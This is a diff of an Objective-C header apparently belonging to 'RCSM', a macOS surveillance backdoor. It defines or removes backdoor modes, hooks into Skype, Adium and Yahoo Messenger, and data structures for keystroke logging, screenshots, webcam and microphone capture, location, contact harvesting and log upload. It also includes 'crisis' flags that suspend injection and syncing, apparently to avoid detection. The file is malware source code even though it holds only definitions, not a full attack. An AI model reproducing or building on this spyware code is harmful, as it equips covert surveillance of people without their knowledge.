@@ -26,8 +26,7 @@
 #import "RCSMSharedMemory.h"
 #import "RCSMUtils.h"
 
-#define INPUT_MANAGER_FOLDER @"appleHID"
-#define OSAX_FOLDER @"appleOsax"
+#define EXT_BUNDLE_FOLDER @"appleHID"
 #define ME __func__
 
 #define LOG_DELIMITER 0xABADC0DE
@@ -57,11 +56,11 @@ extern NSData            *gSessionKey;
 #pragma mark -
 
 #define invokeSupersequent(...) \
-    ([self getImplementationOf:_cmd after:impOfCallingMethod(self, _cmd)]) \
+    ([self getImplementationOf: _cmd after: impOfCallingMethod(self, _cmd)]) \
     (self, _cmd, ##__VA_ARGS__)
 
 #define invokeSupersequentNoParameters() \
-    ([self getImplementationOf:_cmd after:impOfCallingMethod(self, _cmd)]) \
+    ([self getImplementationOf: _cmd after: impOfCallingMethod(self, _cmd)]) \
     (self, _cmd)
 
 #pragma mark -
@@ -119,9 +118,6 @@ typedef struct os_version {
 #define SLI_PLIST @"/Library/Preferences/com.apple.SystemLoginItems.plist"
  
 #define LOG_PREFIX    @"LOGF"
-#define LOG_EXTENSION @".log"
-
-#define SSL_FIRST_COMMAND @".NEWPROTO"
 
 // unixEpoch - winEpoch stuff
 #define EPOCH_DIFF 0x019DB1DED53E8000LL /* 116444736000000000 nsecs */
@@ -151,22 +147,9 @@ extern int gMemLogMaxSize;
 #define SHMEM_LOG_MAX_NUM_BLOCKS    315
 #define SHMEM_LOG_MIN_NUM_BLOCKS    50
 
-// Hooked external apps Identifier
-#define SKYPE @"com.skype.skype"
-#define ADIUM @"com.adiumX.adiumX"
-#define YAHOO @"com.yahoo.messenger3"
-
-#define NEWCONF @"new_juice.mac"
-
 #pragma mark -
 #pragma mark Backdoor Configuration
 #pragma mark -
-
-// Available modes for our backdoor
-#define SLIPLIST @"Ah56K"
-#define UISPOOF  @"Ah57K"
-#define DYLIB    @"Ah58K"
-#define DEV      @"Ah59K"
 
 //
 // Agents
@@ -193,7 +176,6 @@ extern int gMemLogMaxSize;
 #define AGENT_POSITION              0x1220
 #define AGENT_APPLICATION           0x1011
 
-
 //
 // Agents Shared Memory offsets
 //
@@ -213,34 +195,9 @@ extern int gMemLogMaxSize;
 
 extern u_int remoteAgents[];
 
-//
-// Events
-//
-#define EVENT_TIMER       0x0000
-#define EVENT_PROCESS     0x0001
-#define EVENT_CONNECTION  0x0002
-#define EVENT_SCREENSAVER 0x0003
-#define EVENT_SYSLOG      0x0004
-#define EVENT_QUOTA       0x0005
+
 // NEW - TODO
 //#define EVENT_LOCKSCREEN  (uint)0x000x
-
-//
-// Actions
-//
-#define ACTION_SYNC         0x0001
-#define ACTION_AGENT_START  0x0002
-#define ACTION_AGENT_STOP   0x0003
-#define ACTION_EXECUTE      0x0004
-#define ACTION_UNINSTALL    0x0005
-#define ACTION_INFO         0x0006
-
-// Configuration file Tags
-#define EVENT_CONF_DELIMITER "EVENTCONFS-"
-#define AGENT_CONF_DELIMITER "AGENTCONFS-"
-#define LOGRP_CONF_DELIMITER "LOGRPCONFS-"
-#define BYPAS_CONF_DELIMITER "BYPASCONFS-"
-#define ENDOF_CONF_DELIMITER "ENDOFCONFS-"
 
 // Agent Status
 #define AGENT_DISABLED    @"DISABLED"
@@ -266,21 +223,15 @@ extern u_int remoteAgents[];
 #define ACTION_PERFORMING 1
 
 #pragma mark -
-#pragma mark Events/Actions/Agents Parameters
-#pragma mark -
-
-// Agents configuration
-#define CONF_ACTION_NULL        0xFFFFFFFF
-
-#define TIMER_AFTER_STARTUP     0x0
-#define TIMER_LOOP              0x1
-#define TIMER_DATE              0x2
-#define TIMER_INST              0x3
-#define TIMER_DAILY             0x4
-
-#pragma mark -
 #pragma mark Transfer Protocol Definition
 #pragma mark -
+
+// Configuration file Tags
+#define EVENT_CONF_DELIMITER "EVENTCONFS-"
+#define AGENT_CONF_DELIMITER "AGENTCONFS-"
+#define LOGRP_CONF_DELIMITER "LOGRPCONFS-"
+#define BYPAS_CONF_DELIMITER "BYPASCONFS-"
+#define ENDOF_CONF_DELIMITER "ENDOFCONFS-"
 
 // Transfer Protocol Parameters
 #define PROTO_INVALID     0x00
@@ -320,95 +271,6 @@ extern u_int remoteAgents[];
 #define LOG_INFO          0x0241
 
 #pragma mark -
-#pragma mark Configurator Struct Definition
-#pragma mark -
-
-//
-// Definitions of all the struct filled in by the Configurator
-//
-typedef struct _configuration {
-  u_int confID;
-  u_int internalDataSize;
-  NSData *internalData;
-} configurationStruct;
-
-typedef struct _agent {
-  u_int   agentID;
-  u_int   status;  // Running, Stopped
-  u_int   internalDataSize;
-  //void *pParams;
-  NSData  *internalData;
-  void    *pFunc;        // Thread start routine
-  u_int   command;
-} agentStruct;
-
-typedef struct _event {
-  u_int   type;
-  u_int   actionID;
-  u_int   internalDataSize;
-  NSData  *internalData;
-  void    *pFunc;
-  u_int   status;
-  u_int   command;     // Used for communicate within the monitor
-} eventStruct;
-
-typedef struct _action {
-  u_int   type;
-  u_int   internalDataSize;
-  NSData  *internalData;
-} actionStruct;
-
-typedef struct _actionContainer {
-  u_int numberOfSubActions;
-} actionContainerStruct;
-
-typedef struct _eventConf {
-  u_int   numberOfEvents;
-  NSData  *internalData;
-} eventConfStruct;
-
-#pragma mark -
-#pragma mark Events Data Struct Definition
-#pragma mark -
-
-//
-// struct for events data
-//
-typedef struct _timer {
-  u_int type;
-  u_int loDelay;
-  u_int hiDelay;
-  u_int endAction;
-} timerStruct;
-
-typedef struct _process {
-  u_int onClose;
-  u_int lookForTitle;
-  // First bit = 1 Window, 0 Process; Second bit = 1 Focus
-#define EVENT_PROCESS_ON_PROC   0x00000000
-#define EVENT_PROCESS_ON_WINDOW 0x00000001
-#define EVENT_PROCESS_ON_FOCUS  0x00000002
-  char name[256];
-} processStruct;
-
-typedef struct _connection {
-  u_long ipAddress;
-  u_long netMask;
-  u_int port;
-} connectionStruct;
-
-#pragma mark -
-#pragma mark Actions Data Struct Definition
-#pragma mark -
-
-typedef struct _sync {
-  u_int minSleepTime;
-  u_int maxSleepTime;
-  u_int bandwidthLimit;
-  char  configString[256]; // ???
-} syncStruct;
-
-#pragma mark -
 #pragma mark Agents Data Struct Definition
 #pragma mark -
 
@@ -423,127 +285,14 @@ typedef struct _device
   UInt32 isEnabled;
 } deviceStruct;
 
-#define LOGTYPE_LOCATION_NEW    0x1220
-
-#define LOGTYPE_LOCATION_GPS    0x0001
-#define LOGTYPE_LOCATION_GSM    0x0002
-#define LOGTYPE_LOCATION_WIFI   0x0003
-#define LOGTYPE_LOCATION_IP     0x0004
-#define LOGTYPE_LOCATION_CDMA   0x0005
-
-typedef struct _position {
-  UInt32 sleepTime;
-#define LOGGER_GPS  1 // Prendi la posizione dal GPS
-#define LOGGER_GSM  2  // Prendi la posizione dalla BTS
-#define LOGGER_WIFI 4 // Prendi la lista delle reti WiFi in vista
-  UInt32 iType;
-} positionStruct;
-
-typedef struct _LocationAdditionalData {
-	UInt32 uVersion;
-#define LOG_LOCATION_VERSION (UInt32)2010082401
-	UInt32 uType;
-	UInt32 uStructNum;
-} LocationAdditionalData, *pLocationAdditionalData;
-
-typedef struct _screenshot {
-  u_int sleepTime;
-  u_int dwTag;
-  u_int grabActiveWindow; // 1 Window - 0 Entire Desktop
-  u_int grabNewWindows; // 1 TRUE onNewWindow - 0 FALSE
-} screenshotStruct;
-
-typedef struct _microphone {
-  u_int detectSilence;
-  u_int silenceThreshold;
-} microphoneAgentStruct;
-
-// Massimo Chiodini - 05/08/2009
-typedef struct _webcam {
-  u_int sleepTime;
-  u_int numOfFrame; // 1 Window - 0 Entire Desktop
-} webcamStruct;
-// End of Chiodo
-
-typedef struct _logDownload {
-  u_int version;
-#define LOG_FILE_VERSION 2008122901
-  u_int fileNameLength;
-} logDownloadStruct;
-
-typedef struct _mouseConfiguration {
-  u_int width;
-  u_int height;
-} mouseStruct;
-
 typedef struct _voipConfiguration {
   u_int sampleSize;   // Max single-sample size
   u_int compression;  // Compression factor
 } voipStruct;
 
-typedef struct _fileConfiguration {
-  u_int minFileSize;
-  u_int maxFileSize;
-  u_int hiMinDate;
-  u_int loMinDate;
-  u_int reserved1;
-  u_int reserved2;
-  BOOL  noFileOpen;
-  u_int acceptCount;
-  u_int denyCount;
-  char patterns[1]; // wchar_t
-} fileStruct;
-
-typedef struct _urlConfiguration {
-  u_int delimiter;
-  BOOL isSnapshotActive;
-} urlStruct;
-
-#pragma mark -
-#pragma mark Log File Header Struct Definition
-#pragma mark -
-
-//
-// First DWORD is not encrypted and specifies:
-// sizeof(logStruct)
-// + deviceIdLen
-// + userIdLen
-// + sourceIdLen
-// + uAdditionalData
-//
-typedef struct _log {
-  u_int version;
-#define LOG_VERSION   2008121901
-  u_int type;
-  u_int hiTimestamp;
-  u_int loTimestamp;
-  u_int deviceIdLength;       // IMEI/Hostname len
-  u_int userIdLength;         // IMSI/Username len
-  u_int sourceIdLength;       // Caller Number / IP length
-  u_int additionalDataLength; // Size of additional data if present
-} logStruct;
-
 #pragma mark -
 #pragma mark Agents Additional Header
 #pragma mark -
-
-typedef struct _screenshotHeader {
-	u_int version;
-#define LOG_SCREENSHOT_VERSION 2009031201
-	u_int processNameLength;
-	u_int windowNameLength;
-} screenshotAdditionalStruct;
-
-#pragma pack(2)
-
-typedef struct _keylogAdditionalHeader {
-  short zero;
-  struct tm timeStamp;
-  char processName[128];
-  char windowTitle[128];
-  u_int delimiter;
-  char contents[32];
-} keylogEntryHeader;
 
 typedef struct _mouseAdditionalHeader {
   u_int version;
@@ -584,74 +333,6 @@ typedef struct _voipAdditionalHeader {
 #define SAMPLE_RATE_GTALK   48000
 #define SAMPLE_RATE_YMSG    48000
 #define SAMPLE_RATE_MSN     16000
-
-typedef struct _organizerAdditionalHeader{
-  u_int size;
-  u_int version;
-  u_int identifier;
-} organizerAdditionalHeader;
-
-enum contactType {
-  FirstName                 = 0x1,
-  LastName                  = 0x2,
-  CompanyName               = 0x3,
-  BusinessFaxNumber         = 0x4,
-  Department                = 0x5,
-  Email1Address             = 0x6,
-  MobileTelephoneNumber     = 0x7,
-  OfficeLocation            = 0x8, 
-  PagerNumber               = 0x9,
-  BusinessTelephoneNumber   = 0xA,
-  JobTitle                  = 0xB,
-  HomeTelephoneNumber       = 0xC,
-  Email2Address             = 0xD,
-  Spouse                    = 0xE,
-  Email3Address             = 0xF,
-  Home2TelephoneNumber      = 0x10,
-  HomeFaxNumber             = 0x11,
-  CarTelephoneNumber        = 0x12,
-  AssistantName             = 0x13,
-  AssistantTelephoneNumber  = 0x14,
-  Children                  = 0x15,
-  Categories                = 0x16,
-  WebPage                   = 0x17,
-  Business2TelephoneNumber  = 0x18,
-  RadioTelephoneNumber      = 0x19,
-  FileAs                    = 0x1A,
-  YomiCompanyName           = 0x1B,
-  YomiFirstName             = 0x1C,
-  YomiLastName              = 0x1D,
-  Title                     = 0x1E,
-  MiddleName                = 0x1F,
-  Suffix                    = 0x20,
-  HomeAddressStreet         = 0x21,
-  HomeAddressCity           = 0x22,
-  HomeAddressState          = 0x23,
-  HomeAddressPostalCode     = 0x24,
-  HomeAddressCountry        = 0x25,
-  OtherAddressStreet        = 0x26,
-  OtherAddressCity          = 0x27,
-  OtherAddressPostalCode    = 0x28,
-  OtherAddressCountry       = 0x29,
-  BusinessAddressStreet     = 0x2A,
-  BusinessAddressCity       = 0x2B,
-  BusinessAddressState      = 0x2C, 
-  BusinessAddressPostalCode = 0x2D,
-  BusinessAddressCountry    = 0x2E,
-  OtherAddressState         = 0x2F,
-  Body                      = 0x30,
-  // Birthday & Anniversary are string (wchar) converted FILETIME struct
-  Birthday                  = 0x31,
-  Anniversary               = 0x32
-};
-
-typedef struct _microphoneHeader {
-  u_int version;
-#define LOG_MICROPHONE_VERSION 2008121901
-  u_int sampleRate;
-  u_int hiTimestamp;
-  u_int loTimestamp;
-} microphoneAdditionalStruct;
 
 typedef struct _urlSnapshotHeader {
   u_int version;
@@ -764,15 +445,6 @@ extern NSString *gKextName;
 #define CRISIS_HOOK         (UInt32)0x08 // Inibisce injection dylib
 #define CRISIS_SYNC         (UInt32)0x10 // Inibisce sincronizzazione
 
-typedef struct {
-  UInt32  unused;
-  UInt32  check_network;
-  UInt32  check_system;
-  UInt32  network_process_count;
-  UInt32  system_process_count;
-  char    process_names[1];
-} crisis_conf_struct;
-
 extern UInt32          gAgentCrisis;
 extern NSMutableArray  *gAgentCrisisNet;
 extern NSMutableArray  *gAgentCrisisApp;
@@ -798,10 +470,9 @@ NSArray *obtainProcessList  ();
 BOOL findProcessWithName    (NSString *aProcess);
 NSNumber *pidForProcessName (NSString *aProcess);
 
-#pragma mark -
-#pragma mark Unused
-
+#if 0
 IMP impOfCallingMethod (id lookupObject, SEL selector);
+#endif
 
 #pragma mark -
 #pragma mark Networking routines
@@ -823,9 +494,9 @@ int matchPattern(const char *source, const char *pattern);
 NSArray *searchForProtoUpload(NSString *aFileMask);
 NSArray *searchFile(NSString *aFileMask);
 
-static unsigned int sdbm (unsigned char *str);
-unsigned int findSymbolInFatBinary (void *imageBase,
-                                    unsigned int symbolHash);
+static unsigned int sdbm(unsigned char *str);
+unsigned int findSymbolInFatBinary(void *imageBase,
+                                   unsigned int symbolHash);
 
 #ifdef DEBUG_COMMON
 void printFormatFlags(AudioStreamBasicDescription inDescription);
